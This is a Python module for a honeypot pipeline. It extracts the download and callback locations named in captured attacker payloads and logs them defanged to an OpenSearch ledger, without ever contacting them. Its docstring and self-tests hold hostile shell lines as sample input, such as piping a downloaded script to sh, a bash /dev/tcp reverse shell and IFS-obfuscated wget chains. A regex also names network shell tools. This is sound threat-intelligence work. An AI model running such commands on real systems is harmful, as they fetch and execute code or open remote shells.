#!/usr/bin/env python3
"""Dropper ledger for tripwire events.

Exploit payloads name where their second stage lives: `wget http://.../x.sh`,
`/dev/tcp/.../4444`, `tftp -g -r ...`. Those locations are the attacker's own
infrastructure, worth more than the scanning address that delivered them.

This module reads payload text that enrich.py has already stored, writes the
locations back onto the event, and keeps a first-seen ledger of them in the
`dropper-book` index.

It never fetches, resolves, pings or otherwise touches what it finds: this
file imports none of the stdlib modules that could (selftest checks that).
`client` is anything with `call(method, path, body=None) -> (status, doc)`,
which is `enrich.OpenSearch`; this file does not import enrich.

Stdlib only.    python3 droppers.py --selftest   exercises the parser and a
fake OpenSearch client without a network.
"""

import hashlib
import ipaddress
import json
import logging
import re
import sys
import urllib.parse
from datetime import datetime, timezone

INDICES = "tripwire-sentinel-*,tripwire-hits-*,tripwire-fakevm-*"
FIELDS = ("http_body", "payload_text", "http_requests", "body_excerpt", "path", "fakevm.command")
BOOK = "dropper-book"
LOOKBACK = "now-3d"
BATCH = 200
MAX_PER_EVENT = 16
MAX_URL = 512
IGNORE_HOSTS = frozenset({"schemas.xmlsoap.org", "www.w3.org", "schemas.microsoft.com",
                          "purenetworks.com", "localhost"})

log = logging.getLogger("droppers")


# --------------------------------------------------------------------------
# extract
# --------------------------------------------------------------------------

# Real HTTP verbs only, not a generic word pattern: an open-proxy probe's own
# request line is "GET http://target/... HTTP/1.1", and a shell command like
# "wget http://host/x" must never be mistaken for one just because it also
# starts with a short word followed by a scheme.
METHODS = ("GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "CONNECT", "TRACE",
           "PATCH", "PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "SEARCH")

REQUEST_LINE_RE = re.compile(r"^(" + "|".join(METHODS) + r")\s+(?:https?|ftp|tftp)://[^\s/?#]*")

# Every char but whitespace, quotes, angle brackets, backtick, ; | ) and
# backslash. One quantifier, no nesting: a 1 MB run of this pattern is one
# linear scan, not a backtracking blow-up.
URL_RE = re.compile(r"(?:https?|ftp|tftp)://[^\s\"'<>`;|)\\]+", re.IGNORECASE)
DEVTCP_RE = re.compile(r"/dev/(tcp|udp)/([A-Za-z0-9.-]+)/([0-9]+)")
SEGMENT_RE = re.compile(r"[^;|&]+")
BARE_KEYWORD_RE = re.compile(r"\b(?:wget|curl|tftp|ftpget|nc|ncat|busybox)\b", re.IGNORECASE)
# {1,3} and {3} are both small fixed bounds, so this is an ordinary IPv4
# matcher, not the unbounded-inside-unbounded shape that backtracks badly.
BARE_TARGET_RE = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})(?::(\d{1,5}))?(/[^\s;|&]*)?")


def cut_request_line(line):
    """A proxy-probe request line names its own target right after the verb;
    cut just the scheme://authority so that target is never read as a
    dropper, while the rest of the line (path, headers-on-one-line junk) is
    still scanned."""
    m = REQUEST_LINE_RE.match(line)
    if not m:
        return line
    return m.group(1) + " " + line[m.end():]


def normalize(text):
    text = urllib.parse.unquote_plus(text)
    text = text.replace("${IFS}", " ").replace("$IFS", " ")
    return "\n".join(cut_request_line(line) for line in text.split("\n"))


def authority_end(url, start):
    """Index right after scheme:// where the authority (host[:port]) ends."""
    end = len(url)
    for ch in "/?#":
        idx = url.find(ch, start)
        if idx != -1 and idx < end:
            end = idx
    return end


def lower_scheme_host(raw):
    """Lowercase the scheme and the host, not the userinfo: `User:PaSS@` in
    an authority stays exactly as the attacker wrote it."""
    sep = raw.find("://")
    if sep == -1:
        return raw
    start = sep + 3
    end = authority_end(raw, start)
    authority = raw[start:end]
    at = authority.rfind("@")
    if at == -1:
        authority = authority.lower()
    else:
        authority = authority[:at + 1] + authority[at + 1:].lower()
    return raw[:start].lower() + authority + raw[end:]


def host_dropped(host):
    for ignored in IGNORE_HOSTS:
        if host == ignored or host.endswith("." + ignored):
            return True
    try:
        return not ipaddress.ip_address(host).is_global
    except ValueError:
        return False  # not an IP: a bare hostname is never resolved, so kept


def parse_url_match(m):
    raw = m.group(0)
    cut = raw.find("&&")
    if cut != -1:
        raw = raw[:cut]
    raw = raw.rstrip(".,:'\"")
    if "://" not in raw:
        return None
    raw = lower_scheme_host(raw)
    try:
        split = urllib.parse.urlsplit(raw)
        host, port = split.hostname, split.port
    except ValueError:
        return None
    if not host or host_dropped(host) or len(raw) > MAX_URL:
        return None
    item = {"url": raw, "host": host, "kind": "url"}
    if port is not None:
        item["port"] = port
    return item


def parse_devtcp_match(m):
    proto, host, port_s = m.group(1), m.group(2).lower(), m.group(3)
    url = f"{proto}://{host}:{port_s}"
    if host_dropped(host) or len(url) > MAX_URL:
        return None
    return {"url": url, "host": host, "port": int(port_s), "kind": "devtcp"}


def parse_bare_match(m):
    host, port_s, path = m.group(1), m.group(2), m.group(3) or ""
    try:
        ipaddress.IPv4Address(host)
    except ValueError:
        return None  # kind bare's host is an IPv4 address by definition
    url = host + (":" + port_s if port_s else "") + path
    if host_dropped(host) or len(url) > MAX_URL:
        return None
    item = {"url": url, "host": host, "kind": "bare"}
    if port_s:
        item["port"] = int(port_s)
    return item


def extract(text):
    """Pure. Dicts {"url", "host", "port", "kind"} (port absent when there is
    none), distinct by url, in order of appearance, at most MAX_PER_EVENT."""
    text = normalize(text)
    url_matches = list(URL_RE.finditer(text))
    url_spans = [m.span() for m in url_matches]
    candidates = []

    for m in url_matches:
        item = parse_url_match(m)
        if item is not None:
            candidates.append((m.start(), item))

    for m in DEVTCP_RE.finditer(text):
        item = parse_devtcp_match(m)
        if item is not None:
            candidates.append((m.start(), item))

    for seg in SEGMENT_RE.finditer(text):
        if not BARE_KEYWORD_RE.search(seg.group()):
            continue
        for m in BARE_TARGET_RE.finditer(seg.group()):
            gstart, gend = seg.start() + m.start(), seg.start() + m.end()
            if any(gstart < ue and gend > us for us, ue in url_spans):
                continue  # a bare match inside a url match: the url wins
            item = parse_bare_match(m)
            if item is not None:
                candidates.append((gstart, item))

    candidates.sort(key=lambda pair: pair[0])
    seen, out = set(), []
    for _, item in candidates:
        if item["url"] in seen:
            continue
        seen.add(item["url"])
        out.append(item)
        if len(out) >= MAX_PER_EVENT:
            break
    return out


def defang(url):
    """http -> hxxp, ftp -> fxp (a plain substring replace on the scheme,
    which also turns https into hxxps for free), every . in the host part
    into [.]. Both forms are kept in the ledger; alerts use only this one."""
    sep = url.find("://")
    start = sep + 3 if sep != -1 else 0
    scheme = (url[:sep].replace("http", "hxxp").replace("ftp", "fxp") + "://") if sep != -1 else ""
    end = authority_end(url, start)
    return scheme + url[start:end].replace(".", "[.]") + url[end:]


# --------------------------------------------------------------------------
# scan
# --------------------------------------------------------------------------

BOOK_MAPPING = {
    "settings": {"number_of_shards": 1, "number_of_replicas": 0},
    "mappings": {
        "dynamic": False,
        "properties": {
            "url": {"type": "keyword", "ignore_above": 512},
            "url_defanged": {"type": "keyword", "ignore_above": 600},
            "host": {"type": "keyword", "ignore_above": 256},
            "port": {"type": "integer"},
            "kind": {"type": "keyword"},
            "@timestamp": {"type": "date"},
            "first_source_ip": {"type": "ip"},
            "first_index": {"type": "keyword"},
            # When the book learned this location, stamped by record().
            # @timestamp keeps meaning the event's own first sighting.
            "recorded": {"type": "date"},
        },
    },
}


def now_iso():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def ensure_book(client):
    status, doc = client.call("PUT", "/" + BOOK, BOOK_MAPPING)
    if status == 200:
        log.info("created index %s", BOOK)
        return
    if status != 400 or "already_exists" not in json.dumps(doc):
        raise RuntimeError(f"cannot create {BOOK}: {status} {doc}")
    # A book from an older version: creation is the only time the mapping
    # above is read, so hand it the field it has not got. Additive only; a
    # refused update (field already exists with another type) is a warning,
    # not a reason to stop the enricher.
    status, doc = client.call("PUT", f"/{BOOK}/_mapping",
                              {"properties": BOOK_MAPPING["mappings"]["properties"]})
    if status != 200:
        log.warning("cannot update mapping of %s: %s %s", BOOK, status, doc)


def join_fields(src):
    parts = []
    for field in FIELDS:
        value = src
        for key in field.split("."):
            value = value.get(key) if isinstance(value, dict) else None
        if isinstance(value, list):
            parts.append("\n".join(str(v) for v in value))
        elif value:
            parts.append(str(value))
    return "\n".join(parts)


def record(client, item, timestamp, source_ip, index_name):
    """PUT .../_create/<sha256 of url>. 409 means already known, not an
    error: the first sighting is what matters and it is never overwritten."""
    doc_id = hashlib.sha256(item["url"].encode()).hexdigest()
    entry = {"url": item["url"], "url_defanged": defang(item["url"]),
              "host": item["host"], "kind": item["kind"], "first_index": index_name,
              "recorded": now_iso()}
    if "port" in item:
        entry["port"] = item["port"]
    if timestamp:
        entry["@timestamp"] = timestamp
    if source_ip:
        entry["first_source_ip"] = source_ip
    status, resp = client.call("PUT", f"/{BOOK}/_create/{doc_id}", entry)
    if status in (200, 201):
        log.info("new dropper location %s %s", item["kind"], ascii(defang(item["url"])))
    elif status != 409:
        log.warning("dropper record %s: %s %s", doc_id, status, ascii(str(resp))[:200])


def scan(client):
    """Stamp events with what they named, record the locations. Returns the
    number of events successfully stamped."""
    ensure_book(client)
    # ponytail: always the BATCH oldest unstamped events. If their _update
    # keeps failing (index gone read-only inside LOOKBACK), the same ones
    # come back every pass and newer events wait behind them. Upgrade path:
    # search_after past the failures, or remember failures in memory for
    # the process lifetime.
    body = {
        "size": BATCH,
        "sort": [{"@timestamp": "asc"}],
        "_source": list(FIELDS) + ["source.ip", "@timestamp"],
        "query": {"bool": {
            "filter": [{"range": {"@timestamp": {"gte": LOOKBACK}}}],
            "must_not": [{"exists": {"field": "dropper.scanned"}}],
            "should": [{"exists": {"field": f}} for f in FIELDS],
            "minimum_should_match": 1,
        }},
    }
    status, doc = client.call("POST", f"/{INDICES}/_search?ignore_unavailable=true", body)
    if status != 200:
        log.warning("dropper search %s: %s", status, ascii(str(doc))[:200])
        return 0

    stamped = 0
    for hit in doc.get("hits", {}).get("hits", []):
        src = hit.get("_source", {})
        # ponytail: one request per event and per new URL; at a few thousand
        # events a day that is nothing. Move to _bulk when a pass takes
        # longer than the enricher's cycle.
        items = extract(join_fields(src))
        timestamp, source_ip = src.get("@timestamp"), (src.get("source") or {}).get("ip")
        for item in items:
            record(client, item, timestamp, source_ip, hit["_index"])

        stamp = {"doc": {"dropper": {"scanned": True}}}
        if items:
            stamp["doc"]["dropper"]["urls"] = [i["url"] for i in items]
            stamp["doc"]["dropper"]["hosts"] = sorted({i["host"] for i in items})
        status, resp = client.call("POST", f"/{hit['_index']}/_update/{hit['_id']}", stamp)
        if status // 100 == 2:
            stamped += 1
        else:
            log.warning("stamp %s/%s: %s %s", hit["_index"], hit["_id"], status,
                        ascii(str(resp))[:200])
    return stamped


# --------------------------------------------------------------------------
# selftest
# --------------------------------------------------------------------------

class FakeClient:
    """Records every call; answers _search with canned hits, _create and
    _update with configurable statuses. Enough to exercise scan() without a
    network, per acceptance test 11."""

    def __init__(self, hits, create_status=201, update_status=200, fail_update_at=None):
        self.hits = hits
        self.create_status = create_status
        self.update_status = update_status
        self.fail_update_at = fail_update_at
        self.calls = []
        self.updates = 0

    def call(self, method, path, body=None):
        self.calls.append((method, path, body))
        if "_search" in path:
            return 200, {"hits": {"hits": self.hits}}
        if "/_create/" in path:
            return self.create_status, {}
        if "/_update/" in path:
            self.updates += 1
            if self.fail_update_at == self.updates:
                return 500, {"error": "boom"}
            return self.update_status, {}
        return 200, {}  # ensure_book's PUT /dropper-book


def selftest():
    # 1
    items = extract("cd /tmp; wget http://8.8.4.4/bins/x.sh -O- | sh")
    assert len(items) == 1, items
    assert items[0]["url"] == "http://8.8.4.4/bins/x.sh"
    assert items[0]["host"] == "8.8.4.4" and items[0]["kind"] == "url"

    # 2
    items = extract("GET /shell?cd+/tmp;wget+http://8.8.4.4/a;chmod+777+a HTTP/1.1")
    assert [i["url"] for i in items] == ["http://8.8.4.4/a"], items

    # 3
    items = extract("wget${IFS}http://8.8.4.4:81/b&&sh${IFS}b")
    assert len(items) == 1, items
    assert items[0]["url"] == "http://8.8.4.4:81/b" and items[0]["port"] == 81

    # 4
    items = extract("bash -i >& /dev/tcp/8.8.4.4/4444 0>&1")
    assert len(items) == 1, items
    assert items[0] == {"url": "tcp://8.8.4.4:4444", "host": "8.8.4.4",
                         "port": 4444, "kind": "devtcp"}

    # 5
    items = extract("busybox tftp -g -r mips 8.8.4.4; curl -O 8.8.4.4:8080/arm")
    assert len(items) == 2 and all(i["kind"] == "bare" for i in items), items

    # 5b (kind bare's host is an IPv4 address, not any dotted digit string)
    assert extract("wget 999.1.1.1/a") == []
    assert extract("curl 010.1.1.1/x") == []
    items = extract("tftp -g -r m 8.8.4.4")
    assert len(items) == 1 and items[0]["kind"] == "bare", items

    # 6 (proxy-probe request line: the verb's own target is not a dropper)
    assert extract("GET http://judge.example/azenv.php HTTP/1.1") == []

    # 7 (a fixed namespace host, and non-global IPs, are never interesting)
    assert extract('<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">') == []
    assert extract("http://127.0.0.1/x") == []
    assert extract("http://10.0.0.5/x") == []

    # 8 (percent- and +-encoded, one unquote_plus pass decodes it)
    items = extract("%77get%20http%3A%2F%2F8.8.4.4%2Fz")
    assert [i["url"] for i in items] == ["http://8.8.4.4/z"], items

    # 8b (scheme and host are lowercased, userinfo is kept as written)
    items = extract("wget http://User:PaSS@8.8.4.4/A.sh")
    assert items[0]["url"] == "http://User:PaSS@8.8.4.4/A.sh", items
    assert items[0]["host"] == "8.8.4.4", items

    # 9
    thirty = " ".join(f"http://8.8.4.4/p{n}" for n in range(30))
    assert len(extract(thirty)) == MAX_PER_EVENT
    same = " ".join(["http://8.8.4.4/x"] * 30)
    assert len(extract(same)) == 1
    long_url = "http://8.8.4.4/" + "a" * 600
    assert extract(long_url) == []

    # 10
    assert defang("http://evil.example.com:8080/a.sh") == \
        "hxxp://evil[.]example[.]com:8080/a.sh"

    # Nested fake-VM command text follows the same extraction/update path.
    fakevm_hit = {"_index": "tripwire-fakevm-000001", "_id": "test-fakevm",
                  "_source": {"fakevm": {"command": "wget http://8.8.4.4/test.sh"},
                              "source": {"ip": "8.8.4.4"}, "@timestamp": "2026-09-19T00:00:00Z"}}
    fakevm_client = FakeClient([fakevm_hit])
    assert scan(fakevm_client) == 1
    fakevm_updates = [c for c in fakevm_client.calls if "/_update/" in c[1]]
    assert fakevm_updates[0][2]["doc"]["dropper"]["urls"] == ["http://8.8.4.4/test.sh"]
    assert join_fields({"fakevm": "invalid"}) == ""

    # 11: success path, two hits, only the first has a body worth extracting
    hits = [
        {"_index": "tripwire-sentinel-2026.09.19", "_id": "a1",
         "_source": {"http_body": "wget http://8.8.4.4/x.sh",
                     "@timestamp": "2026-09-19T00:00:00Z", "source": {"ip": "8.8.4.4"}}},
        {"_index": "tripwire-sentinel-2026.09.19", "_id": "a2",
         "_source": {"path": "/", "@timestamp": "2026-09-19T00:00:01Z",
                     "source": {"ip": "8.8.4.4"}}},
    ]
    client = FakeClient(hits)
    n = scan(client)
    assert n == 2, n
    updates = [c for c in client.calls if "/_update/" in c[1]]
    assert len(updates) == 2
    assert updates[0][2]["doc"]["dropper"]["scanned"] is True
    assert "urls" in updates[0][2]["doc"]["dropper"]
    assert "urls" not in updates[1][2]["doc"]["dropper"]
    create_calls = [c for c in client.calls if "/_create/" in c[1]]
    assert len(create_calls) == 1
    # Alert integrity acceptance test 12: the ledger entry carries "recorded"
    # (when the book learned it), and "@timestamp" is still the event's own
    # timestamp, not now.
    create_body = create_calls[0][2]
    assert create_body["@timestamp"] == "2026-09-19T00:00:00Z", create_body
    assert "recorded" in create_body and create_body["recorded"] != create_body["@timestamp"], \
        create_body

    # 11: partial failure, 409 on _create (already known), 500 on one _update
    hits2 = [
        {"_index": "tripwire-sentinel-2026.09.19", "_id": "b1",
         "_source": {"http_body": "wget http://8.8.4.4/y.sh",
                     "@timestamp": "2026-09-19T00:00:00Z", "source": {"ip": "8.8.4.4"}}},
        {"_index": "tripwire-sentinel-2026.09.19", "_id": "b2",
         "_source": {"http_body": "wget http://8.8.4.4/z.sh",
                     "@timestamp": "2026-09-19T00:00:01Z", "source": {"ip": "8.8.4.4"}}},
    ]
    client2 = FakeClient(hits2, create_status=409, fail_update_at=2)
    n = scan(client2)
    assert n == 1, n

    # 12: the needles are built at runtime so this check does not trip on
    # its own source text.
    with open(__file__, encoding="utf-8") as fh:
        source = fh.read()
    needles = ["import" + " socket", "urllib" + ".request",
               "sub" + "process", "http" + ".client"]
    assert not [n for n in needles if n in source], "forbidden import present"

    # 13: hostile input finishes fast and never raises
    import time
    for hostile in ("http://" * 150000, "\x00" * 4096, ""):
        start = time.monotonic()
        extract(hostile)
        assert time.monotonic() - start < 1.0

    print("selftest ok")


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        selftest()
    else:
        sys.exit("usage: python droppers.py --selftest")
